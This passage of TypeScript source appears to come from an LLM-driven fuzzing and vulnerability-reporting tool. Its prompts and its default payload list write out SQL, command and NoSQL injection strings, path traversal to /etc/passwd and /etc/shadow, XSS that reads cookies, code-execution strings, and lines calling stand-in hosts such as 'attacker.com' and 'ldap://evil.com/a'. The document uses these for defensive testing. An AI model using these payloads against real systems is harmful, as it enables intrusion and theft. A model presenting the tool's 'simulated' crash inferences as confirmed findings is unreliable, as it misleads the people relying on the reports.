  "targets": [
    {
      "functionName": "string (exact function name from CKG)",
      "reasoning": "string (why this is a high-value target - input type, complexity, impact)",
      "language": "string (C|C++|Python|JavaScript|TypeScript|Java|Go|Rust)"
    }
  ]
}`;

export async function identifyFuzzTargets(ckgSummary: string): Promise<FuzzTarget[]> {
    const userPrompt = `CKG Description:\n---\n${ckgSummary}\n---`;
    
    try {
        const responseText = await callMistralAPI(TARGET_PROMPT, userPrompt, 'json');
        const cleanedJSON = extractJSON(responseText);
        
        // Validate with Zod schema
        const validated = FuzzTargetResponseSchema.parse(JSON.parse(cleanedJSON));
        
        if (!validated.targets || validated.targets.length === 0) {
            console.warn("⚠️ AI did not return any fuzz targets, generating default targets from CKG");
            return generateDefaultFuzzTargets(ckgSummary);
        }
        
        console.log(`✅ AI identified ${validated.targets.length} fuzz targets`);
        return validated.targets as FuzzTarget[];
        
    } catch (error) {
        console.warn("⚠️ Failed to identify fuzz targets with AI, falling back to heuristic analysis");
        console.error("Error details:", error);
        
        // Fallback: Generate default targets based on CKG analysis
        return generateDefaultFuzzTargets(ckgSummary);
    }
}

/**
 * Fallback function to generate default fuzz targets when AI fails
 * Uses heuristic analysis of the CKG summary
 */
function generateDefaultFuzzTargets(ckgSummary: string): FuzzTarget[] {
    console.log('🔍 Generating default fuzz targets from CKG heuristics...');
    
    const targets: FuzzTarget[] = [];
    
    // Extract actual function names from CKG - look for patterns like "Function: functionName"
    const functionDeclarationPattern = /(?:function|Function|def|fn|method|Method)[\s:]+([a-zA-Z_][a-zA-Z0-9_]*)/gi;
    const explicitFunctions = new Set<string>();
    
    let match;
    while ((match = functionDeclarationPattern.exec(ckgSummary)) !== null) {
        if (match[1] && match[1].length > 2 && match[1].length < 50) {
            explicitFunctions.add(match[1]);
        }
    }
    
    console.log(`📍 Found ${explicitFunctions.size} explicit function declarations in CKG`);
    
    // Common function patterns that are good fuzz targets (only if no explicit functions found)
    const patterns = [
        { regex: /\b(validate|verify|check|parse|process|handle|execute|eval|render)[a-zA-Z0-9_]*/gi, priority: 1 },
        { regex: /\b(login|authenticate|authorize|register|signup|signin)[a-zA-Z0-9_]*/gi, priority: 2 },
        { regex: /\b(upload|download|read|write|save|load|store)[a-zA-Z0-9_]*/gi, priority: 3 },
        { regex: /\b(query|search|filter|find|get|fetch|retrieve)[a-zA-Z0-9_]*/gi, priority: 4 },
        { regex: /\b(encode|decode|encrypt|decrypt|hash|sign)[a-zA-Z0-9_]*/gi, priority: 5 }
    ];
    
    // Try to extract function names from CKG summary
    const functionMatches = new Set<string>();
    
    // First, add explicit function declarations
    explicitFunctions.forEach(fn => functionMatches.add(fn));
    
    // If we didn't find explicit functions, use pattern matching
    if (functionMatches.size === 0) {
        console.log('⚠️ No explicit functions found, using pattern matching...');
        for (const pattern of patterns) {
            const matches = ckgSummary.match(pattern.regex);
            if (matches) {
                matches.forEach(match => {
                    // Clean up the match (remove trailing words like "ing", "ed", etc.)
                    const cleaned = match.replace(/\b(the|and|or|with|from|to|in|at|by)\b/gi, '').trim();
                    if (cleaned.length > 2 && cleaned.length < 50) {
                        functionMatches.add(cleaned);
                    }
                });
            }
        }
    }
    
    // Convert to fuzz targets
    const functionArray = Array.from(functionMatches).slice(0, 5); // Top 5 targets
    
    if (functionArray.length > 0) {
        functionArray.forEach((funcName, idx) => {
            // Determine if this was explicitly found or pattern-matched
            const method = explicitFunctions.has(funcName) ? 'explicit declaration' : 'pattern-based detection';
            
            targets.push({
                functionName: funcName,
                reasoning: `Identified via heuristic analysis as potential security-critical function (${method})`,
                language: detectLanguageFromCKG(ckgSummary)
            });
        });
        
        console.log(`✅ Generated ${targets.length} default fuzz targets via heuristics`);
    } else {
        // Ultimate fallback: generic targets based on detected language
        console.warn('⚠️ No functions found in CKG, creating generic fuzz targets');
        const language = detectLanguageFromCKG(ckgSummary);
        
        if (language === 'Python') {
            targets.push({
                functionName: 'main',
                reasoning: 'Default target: main entry point (fallback when no specific functions identified)',
                language: 'Python'
            });
            targets.push({
                functionName: 'handle_request',
                reasoning: 'Default target: common request handler pattern (fallback)',
                language: 'Python'
            });
        } else {
            targets.push({
                functionName: 'main',
                reasoning: 'Default target: main entry point (fallback when no specific functions identified)',
                language: language
            });
            targets.push({
                functionName: 'handleRequest',
                reasoning: 'Default target: common request handler pattern (fallback)',
                language: language
            });
        }
    }
    
    return targets;
}

/**
 * Detect programming language from CKG summary
 */
function detectLanguageFromCKG(ckgSummary: string): string {
    const summary = ckgSummary.toLowerCase();
    
    if (summary.includes('python') || summary.includes('.py') || summary.includes('def ')) return 'Python';
    if (summary.includes('javascript') || summary.includes('.js') || summary.includes('function')) return 'JavaScript';
    if (summary.includes('typescript') || summary.includes('.ts')) return 'TypeScript';
    if (summary.includes('java') || summary.includes('.java')) return 'Java';
    if (summary.includes('c++') || summary.includes('.cpp') || summary.includes('.hpp')) return 'C++';
    if (summary.includes('golang') || summary.includes('.go')) return 'Go';
    if (summary.includes('rust') || summary.includes('.rs')) return 'Rust';
    if (summary.includes('.c') || summary.includes('.h')) return 'C';
    
    return 'JavaScript'; // Default fallback
}

const PROMPTFUZZ_PROMPT = `# ROLE
Senior Fuzzing Engineer - Generate 25-30 diverse fuzz inputs to trigger crashes.

# ATTACK TYPES
1. **Boundary**: "", null, 0, -1, 2147483647, "A"*10000, NaN, Infinity
2. **Injection**: ' OR '1'='1, ; ls, {"$gt":""}, %s%s%s, <script>alert(1)</script>
3. **Path**: ../../../etc/passwd, ..%252f, /etc/passwd%00
4. **Overflow**: "A"*1024, "X"*8192, "Aa0Aa1..."
5. **Encoding**: \u0000, %20, %2F, VGVzdA==, %2541
6. **Language-Specific**:
   - JS: {"__proto__":{"isAdmin":true}}, (a+)+b, [], NaN
   - Python: {{7*7}}, __import__('os')
   - Java: \${jndi:ldap://evil.com/a}

# OUTPUT
Return 25-30 raw fuzz inputs, one per line. NO explanations.

Example:

' OR '1'='1
{"__proto__":{"isAdmin":true}}
../../../etc/passwd
AAAAAAAAAAAAAAAAAAAA
%s%s%s%s%s
0
-2147483648
; ls -la
\${jndi:ldap://evil.com/a}
`;

export async function generatePromptFuzzInputs(fuzzTargets: FuzzTarget[]): Promise<string> {
    console.log("💉 generatePromptFuzzInputs called with", fuzzTargets.length, "targets");
    const userPrompt = `Fuzz Targets:\n---\n${fuzzTargets.map(t => `- ${t.functionName}: ${t.reasoning}`).join('\n')}\n---`;
    
    try {
        console.log("📤 Requesting PromptFuzz generation from API...");
        const responseText = await callMistralAPI(PROMPTFUZZ_PROMPT, userPrompt);
        console.log("📥 PromptFuzz response received, length:", responseText.length);
        
        // Check if response is empty or invalid
        if (!responseText || responseText.trim().length < 10) {
            console.warn('⚠️ AI returned empty PromptFuzz inputs, using default payload set');
            return generateDefaultFuzzInputs(fuzzTargets);
        }
        
        console.log("✅ PromptFuzz generation successful");
        return responseText;
    } catch (error) {
        console.warn("⚠️ Failed to generate PromptFuzz inputs with AI, using default payload set");
        console.error("Error details:", error);
        return generateDefaultFuzzInputs(fuzzTargets);
    }
}

/**
 * Fallback function to generate default fuzz inputs when AI fails
 * Returns a comprehensive set of common vulnerability payloads
 */
function generateDefaultFuzzInputs(fuzzTargets: FuzzTarget[]): string {
    console.log('🔍 Generating default fuzz inputs for', fuzzTargets.length, 'targets');
    
    const language = fuzzTargets[0]?.language || 'JavaScript';
    
    let inputs = `# Default Fuzz Inputs for ${fuzzTargets.map(t => t.functionName).join(', ')}\n\n`;
    inputs += `## Target Language: ${language}\n\n`;
    inputs += `### Edge Cases & Boundary Values\n`;
    inputs += `- Empty string: ""\n`;
    inputs += `- Null values: null, None, nil\n`;
    inputs += `- Zero: 0\n`;
    inputs += `- Negative: -1, -999999\n`;
    inputs += `- Large numbers: 2147483647, 9223372036854775807\n`;
    inputs += `- Boolean edge cases: true, false, True, False\n\n`;
    
    inputs += `### SQL Injection Payloads\n`;
    inputs += `- ' OR '1'='1\n`;
    inputs += `- ' OR '1'='1' --\n`;
    inputs += `- admin' --\n`;
    inputs += `- ' UNION SELECT NULL--\n`;
    inputs += `- 1' AND '1'='1\n`;
    inputs += `- '; DROP TABLE users--\n`;
    inputs += `- ' OR 1=1--\n\n`;
    
    inputs += `### Command Injection Payloads\n`;
    inputs += `- ; ls -la\n`;
    inputs += `- | whoami\n`;
    inputs += `- \`cat /etc/passwd\`\n`;
    inputs += `- $(curl attacker.com)\n`;
    inputs += `- & dir\n`;
    inputs += `- && cat /etc/shadow\n\n`;
    
    inputs += `### Path Traversal Payloads\n`;
    inputs += `- ../../../../../../etc/passwd\n`;
    inputs += `- ..\\..\\..\\..\\..\\windows\\win.ini\n`;
    inputs += `- ....//....//....//etc/passwd\n`;
    inputs += `- ..%2F..%2F..%2Fetc%2Fpasswd\n`;
    inputs += `- ..%5c..%5c..%5cwindows%5cwin.ini\n\n`;
    
    inputs += `### XSS Payloads\n`;
    inputs += `- <script>alert(1)</script>\n`;
    inputs += `- <img src=x onerror=alert(1)>\n`;
    inputs += `- <svg onload=alert(1)>\n`;
    inputs += `- javascript:alert(document.cookie)\n`;
    inputs += `- <iframe src="javascript:alert(1)">\n\n`;
    
    inputs += `### Buffer Overflow / Large Inputs\n`;
    inputs += `- "A" * 1000\n`;
    inputs += `- "B" * 10000\n`;
    inputs += `- "C" * 100000\n`;
    inputs += `- Very long string: ${"X".repeat(1000)}\n\n`;
    
    inputs += `### Format String Attacks\n`;
    inputs += `- %s%s%s%s%s%s%s\n`;
    inputs += `- %x%x%x%x%x%x\n`;
    inputs += `- %n%n%n%n\n\n`;
    
    inputs += `### NoSQL Injection (JSON)\n`;
    inputs += `- {"$ne": null}\n`;
    inputs += `- {"$gt": ""}\n`;
    inputs += `- {"$where": "1==1"}\n`;
    inputs += `- {"__proto__": {"admin": true}}\n\n`;
    
    if (language === 'Python') {
        inputs += `### Python-Specific Payloads\n`;
        inputs += `- __import__('os').system('ls')\n`;
        inputs += `- eval('1+1')\n`;
        inputs += `- exec('import os; os.system("whoami")')\n`;
        inputs += `- pickle.loads(malicious_data)\n\n`;
    } else if (language === 'JavaScript' || language === 'TypeScript') {
        inputs += `### JavaScript-Specific Payloads\n`;
        inputs += `- eval('alert(1)')\n`;
        inputs += `- Function('return process')().exit()\n`;
        inputs += `- require('child_process').exec('ls')\n`;
        inputs += `- constructor.constructor('return process')()\n\n`;
    }
    
    inputs += `### Special Characters & Encoding\n`;
    inputs += `- Null bytes: \\x00\\x00\\x00\n`;
    inputs += `- Unicode: \\u0000, \\uFFFD\n`;
    inputs += `- URL encoding: %00, %0A, %0D\n`;
    inputs += `- Double encoding: %2527, %252e\n`;
    inputs += `- Mixed case: AdMiN, SeLeCt\n\n`;
    
    inputs += `### IDOR / Authorization Bypass\n`;
    inputs += `- user_id=1, user_id=2, user_id=999\n`;
    inputs += `- id=../../../admin\n`;
    inputs += `- role=admin, role=superuser\n\n`;
    
    inputs += `### Race Conditions\n`;
    inputs += `- Rapid sequential requests\n`;
    inputs += `- Concurrent operations on same resource\n`;
    inputs += `- Time-of-check-time-of-use (TOCTOU)\n\n`;
    
    inputs += `---\n`;
    inputs += `Total payloads: 50+ covering common vulnerability classes\n`;
    
    return inputs;
}

const SIMULATE_AND_REPORT_PROMPT = `# ROLE & EXPERTISE
You are a **Principal Security Researcher** and CVE Numbering Authority (CNA) Board Member with 20+ years publishing critical vulnerability research. Your work has been cited in CISA KEV catalog, OWASP guides, and NIST CVE database. You specialize in synthesizing complex security findings into actionable, board-ready vulnerability reports.

# SPECIALIZED KNOWLEDGE
- CVSS v3.1 scoring methodology (Base, Temporal, Environmental metrics)
- CVE ID assignment and vulnerability disclosure processes
- Exploit development and proof-of-concept creation
- Attack chain construction (initial access → privilege escalation → impact)
- Vulnerability classification (CWE taxonomy)
- Risk quantification and business impact analysis

# REPORT SYNTHESIS PHILOSOPHY
**One critical vulnerability with complete context is worth more than ten vague warnings.**

Your goal: Identify the SINGLE most exploitable, highest-impact security flaw from all available evidence.

# 4-PHASE ANALYSIS FRAMEWORK

## PHASE 1: Threat Modeling
Review all findings and ask:
- **Remote vs Local**: Can attacker exploit this without authenticated access?
- **Attack Complexity**: How many steps to exploitation? (Fewer = worse)
- **Privilege Required**: None > Low > High
- **User Interaction**: None required > Requires social engineering

## PHASE 2: Impact Analysis (CIA Triad)
For each finding, assess:
- **Confidentiality**: What sensitive data is exposed? (PII, credentials, source code)
- **Integrity**: Can attacker modify data? (database tampering, code injection)
- **Availability**: Can attacker crash service or cause DoS?

**Impact Hierarchy (worst to best)**:
1. **Critical**: Remote Code Execution, Authentication Bypass, Hardcoded Admin Credentials
2. **High**: IDOR, SQL Injection, Privilege Escalation, Arbitrary File Upload
3. **Medium**: SSRF (internal network only), XSS (reflected), Info Disclosure (non-PII)
4. **Low**: Missing security headers, Verbose error messages, Deprecated crypto (no active exploit)

## PHASE 3: Severity Calculation (CVSS-Inspired)
Use this mental framework:

**Base Score Components**:
- Attack Vector (AV): Network (0.85) > Adjacent (0.62) > Local (0.55)
- Attack Complexity (AC): Low (0.77) > High (0.44)
- Privileges Required (PR): None (0.85) > Low (0.62) > High (0.27)
- User Interaction (UI): None (0.85) > Required (0.62)
- Scope (S): Changed (exploiting one component affects another) vs Unchanged
- Confidentiality (C): High > Low > None
- Integrity (I): High > Low > None
- Availability (A): High > Low > None

**Severity Thresholds**:
- **Critical (9.0-10.0)**: RCE, Auth bypass, Hardcoded admin creds, Pre-auth SQLi
- **High (7.0-8.9)**: IDOR, Post-auth SQLi, Privilege escalation, Deserialization
- **Medium (4.0-6.9)**: SSRF (internal), XSS (stored), CSRF, Info disclosure
- **Low (0.1-3.9)**: Missing headers, Verbose errors, Weak cipher suites

## PHASE 4: Vulnerability Selection Criteria
Prioritize findings in this order:

1. **CVE/Threat Intel Match**: Findings with threatIntelMatch = CRITICAL priority (known exploits exist)
2. **Authentication/Authorization Flaws**: Hardcoded passwords, BOLA, broken auth
3. **Injection Vulnerabilities**: SQL injection, Command injection, XXE
4. **Code Execution Paths**: RCE, Deserialization, Template injection
5. **Simulated Fuzz Crashes**: Buffer overflows, NULL pointer dereferences (infer from fuzz inputs + target function)
6. **Data Exposure**: Sensitive info in logs, API responses, error messages
7. **Configuration Issues**: CORS misconfiguration, debug mode enabled

# CVE ID ASSIGNMENT LOGIC (HONEST APPROACH)
- If CVE-YYYY-NNNNN pattern found in threatIntelMatch → Use that CVE ID (for known published vulnerabilities)
- For NEW findings → Generate internal tracking ID: "Internal-FZF-[timestamp]-[hash]" (e.g., "Internal-FZF-1736527200-A3F2")
- For low-priority findings → Use "No CVE Assigned"

**CRITICAL DISCLAIMER**: Internal tracking IDs (Internal-FZF-*) are NOT official CVE identifiers. They are internal reference numbers for this analysis only. Official CVE assignment requires:
1. Vulnerability disclosure to the vendor/maintainer
2. Submission to MITRE CVE Program or CNA (CVE Numbering Authority)
3. Public disclosure coordination
4. Verification and acceptance by MITRE

Do NOT present internal IDs as official CVEs to avoid legal/ethical issues.

# OUTPUT REQUIREMENTS

## vulnerabilityTitle
- Format: "[SEVERITY] [Vulnerability Type] in [Component/Function]"
- Examples:
  - "CRITICAL: Hardcoded Admin Credentials in AuthController.login()"
  - "HIGH: SQL Injection via User Search Parameter"
  - "CRITICAL: Remote Code Execution through Deserialization in /api/upload"

## cveId
- Use existing CVE if matched in threat intel (e.g., "CVE-2023-1234")
- Generate "Internal-FZF-[timestamp]-[hash]" for new critical/high findings (NOT an official CVE - internal tracking only!)
- Use "No CVE Assigned" for medium/low or non-exploitable findings

## severity
- Must be one of: "Critical", "High", "Medium", "Low"
- Apply CVSS-inspired logic from Phase 3

## description
- **Paragraph 1**: What is the vulnerability? (technical explanation)
- **Paragraph 2**: How can an attacker exploit this? (attack scenario)
- **Paragraph 3**: What is the business impact? (data breach, service disruption, regulatory penalties)
- Include specific function names, variable names, endpoint paths
- Reference OWASP/CWE classifications if applicable

## vulnerableCode
- Extract the EXACT vulnerable code snippet from CKG/findings
- If from fuzzing simulation, show the target function signature
- Include enough context (5-10 lines) to understand the flaw
- Use proper formatting with language syntax

## language
- Detect from code patterns: C, C++, Python, JavaScript, TypeScript, Java, Go, Rust, PHP, etc.
- If multiple languages, choose the one with the vulnerability

## mitigation
- **Short-term fix** (immediate workaround): Disable feature, block endpoint, input sanitization
- **Long-term fix** (proper remediation): Code example showing secure implementation
- Provide **specific code changes**, not generic advice like "validate all inputs"
- Reference security libraries/frameworks if applicable (e.g., "Use parameterized queries with PDO")

# CRITICAL CONSTRAINTS
- **MUST select only ONE vulnerability** (the most critical)
- If no exploitable vulnerabilities found, select highest-severity issue available
- **Findings with CVE matches** or "Critical" severity take absolute precedence
- Include proof-of-concept attack details in description
- Mitigation MUST be actionable code-level changes, not vague recommendations
- If simulating fuzzing crash, explain HOW the fuzz input would trigger the bug

# FUZZING CRASH SIMULATION LOGIC
If selecting a fuzz target as the vulnerability:
- **Infer plausible crash**: Based on target function + fuzz inputs
  - Example: If function is parseJSON(input) and fuzz input is "A"*10000 → Buffer overflow
  - Example: If function is calculateDiscount(price) and fuzz input is -99999 → Integer underflow
- **Describe attack vector**: How attacker sends malicious input
- **Explain impact**: What happens when function crashes (DoS, RCE, info leak)

Return ONLY valid JSON:
{
  "vulnerabilityTitle": "string (format: [SEVERITY] [Type] in [Component])",
  "cveId": "string (CVE-YYYY-NNNNN or N/A)",
  "severity": "Critical|High|Medium|Low",
  "description": "string (3-paragraph explanation: what, how to exploit, business impact)",
  "vulnerableCode": "string (exact code snippet with context)",
  "language": "string (C|C++|Python|JavaScript|TypeScript|Java|Go|Rust|PHP)",
  "mitigation": "string (short-term + long-term fixes with specific code examples)"
}
`;

export async function simulateFuzzingAndGenerateReport(ckgSummary: string, reconFindings: ReconFinding[], apiFindings: APIFinding[], fuzzTargets: FuzzTarget[], fuzzInputs: string): Promise<VulnerabilityReportData> {
    const targetsText = fuzzTargets.map(t => `- ${t.functionName}: ${t.reasoning}`).join('\n');
    const reconText = reconFindings.length > 0 ? reconFindings.map(f => `- ${f.category} (${f.threatIntelMatch || 'N/A'}): ${f.description}`).join('\n') : "No findings.";
    const apiText = apiFindings.length > 0 ? apiFindings.map(f => `- ${f.category} (${f.severity}): ${f.description}`).join('\n') : "No findings.";
    
    const userPrompt = `Code Knowledge Graph:\n---\n${ckgSummary}\n---\n\nStatic Reconnaissance Findings:\n---\n${reconText}\n---\n\nAPI Security Findings:\n---\n${apiText}\n---\n\nFuzz Targets:\n---\n${targetsText}\n---\n\nFuzz Inputs Used:\n---\n${fuzzInputs}\n---`;

    try {
        const responseText = await callMistralAPI(SIMULATE_AND_REPORT_PROMPT, userPrompt, 'json');
        const cleanedJSON = extractJSON(responseText);
        
        // Validate with Zod schema
        const validated = VulnerabilityReportSchema.parse(JSON.parse(cleanedJSON));
        const report = validated as VulnerabilityReportData;
        
        if (!report.vulnerabilityTitle || !report.severity) {
             throw new Error("Invalid report format received from AI.");
        }
        return report;
    } catch (error) {
        console.error("Error simulating fuzzing or generating report:", error);
        if (error instanceof Error && error.message.includes('ZodError')) {
            throw new Error("AI returned invalid vulnerability report structure.");
        }
        throw new Error("The AI failed to synthesize findings and generate a report.");
    }
}

/**
 * PHASE 3: REAL FUZZING ENGINE INTEGRATION
 * Execute actual fuzz tests with mutation-based input generation
 * NOT LLM simulation - this runs real code!
 */
export async function executeRealFuzzingAndGenerateReport(
    codeFiles: Map<string, { code: string; language: string; filename: string }>,
    ckgSummary: string,
    reconFindings: ReconFinding[],
    apiFindings: APIFinding[],
    fuzzTargets: FuzzTarget[]
): Promise<VulnerabilityReportData> {
    console.log('🐛 PHASE 3: Starting REAL fuzzing engine (not LLM simulation)');
    
    // Check if codebase is compatible with JavaScript fuzzing engine
    const hasJavaScriptCode = Array.from(codeFiles.values()).some(file => 
        file.language === 'JavaScript' || file.language === 'TypeScript'
    );
    
    const primaryLanguage = fuzzTargets[0]?.language || 'Unknown';
    
    if (!hasJavaScriptCode || (primaryLanguage !== 'JavaScript' && primaryLanguage !== 'TypeScript')) {
        console.warn(`⚠️ Codebase language (${primaryLanguage}) not compatible with JavaScript fuzzing engine`);
        console.warn('⚠️ Falling back to LLM-based analysis');
        
        return await simulateFuzzingAndGenerateReport(
            ckgSummary,
            reconFindings,
            apiFindings,
            fuzzTargets,
            `Real fuzzing engine unavailable (language incompatibility: ${primaryLanguage} codebase requires ${primaryLanguage} fuzzing engine)`
        );
    }
    
    // Initialize fuzzing engine with aggressive settings for hackathon demo
    const fuzzEngine = new JavaScriptFuzzingEngine({
        maxExecutions: 500,  // More iterations for better crash discovery
        timeout: 2000,       // 2 second timeout per execution
        mutationStrategy: 'hybrid'
    });
    
    // Convert fuzz targets to engine format
    const targets = fuzzTargets.map(t => ({
        functionName: t.functionName,
        params: ['string', 'string', 'number'] // Default param types, can be enhanced
    }));
    
    let bestVulnerability: VulnerabilityReportData | null = null;
    let usedRealFuzzing = false;
    
    try {
        // Execute REAL fuzzing
        const fuzzResults = await fuzzEngine.fuzzCodebase(codeFiles, targets);
        usedRealFuzzing = true;
        
        console.log(`✅ Real fuzzing complete: ${fuzzResults.size} functions fuzzed`);
        
        // Find the most interesting vulnerability from fuzz results
        let highestSeverityCrashes = 0;
        
        for (const [funcName, result] of fuzzResults.entries()) {
            if (result.crashes.length > 0) {
                const criticalCrashes = result.crashes.filter(c => c.severity === 'Critical').length;
                
                if (criticalCrashes > highestSeverityCrashes || !bestVulnerability) {
                    highestSeverityCrashes = criticalCrashes;
                    
                    const vulnData = generateVulnerabilityFromFuzz(result);
                    if (vulnData) {
                        bestVulnerability = {
                            vulnerabilityTitle: vulnData.title,
                            cveId: `Internal-FZF-${Date.now()}-${Math.random().toString(36).substring(7).toUpperCase()}`,
                            severity: result.crashes[0].severity,
                            description: vulnData.description,
                            vulnerableCode: vulnData.vulnerableCode,
                            language: 'JavaScript',
                            mitigation: vulnData.mitigation
                        };
                    }
                }
            }
        }
        
        // If real fuzzing found vulnerabilities, use them
        if (bestVulnerability) {
            console.log(`🎯 Real fuzzing discovered: ${bestVulnerability.vulnerabilityTitle}`);
            return bestVulnerability;
        }
        
        // No crashes found, but fuzzing succeeded
        console.log('⚠️ No crashes found in fuzzing, falling back to LLM-based analysis');
        
    } catch (fuzzingError) {
        // Fuzzing engine failed (VM execution error, syntax error, etc.)
        console.warn('⚠️ Real fuzzing engine failed, falling back to LLM-based analysis');
        console.error('Fuzzing error details:', fuzzingError);
        usedRealFuzzing = false;
    }
    
    // Fallback: Use LLM-based analysis
    const fallbackReason = usedRealFuzzing 
        ? 'Real fuzzing executed but no crashes found'
        : 'Real fuzzing engine unavailable (VM execution failed)';
        
    return await simulateFuzzingAndGenerateReport(
        ckgSummary,
        reconFindings,
        apiFindings,
        fuzzTargets,
        fallbackReason
    );
}



